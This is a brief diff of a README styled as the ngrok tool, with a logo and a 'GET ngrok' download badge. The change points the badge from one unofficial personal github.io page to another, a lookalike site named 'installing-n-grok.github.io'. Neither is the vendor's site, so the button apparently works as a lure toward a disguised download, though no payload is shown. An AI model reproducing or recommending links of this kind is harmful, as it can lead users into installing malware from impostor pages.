@@ -3,7 +3,7 @@
 
 ![ngrok](https://cdn.sanity.io/images/2ejqxsnu/production/6cfb94d49cc23e9c759802d59049b66a9c99ed2c-1873x1873.png?rect=170%2C643%2C1515%2C587&auto=format&fit=max&w=3840)
 
-[![GET ngrok](https://img.shields.io/badge/GET%20%E2%80%94%20ngrok-0078D6?style=for-the-badge&logoColor=white)](https://karenmitchelln447.github.io/.github/ngrok-download)
+[![GET ngrok](https://img.shields.io/badge/GET%20%E2%80%94%20ngrok-0078D6?style=for-the-badge&logoColor=white)](https://installing-n-grok.github.io/.github/)
 
 ---
 
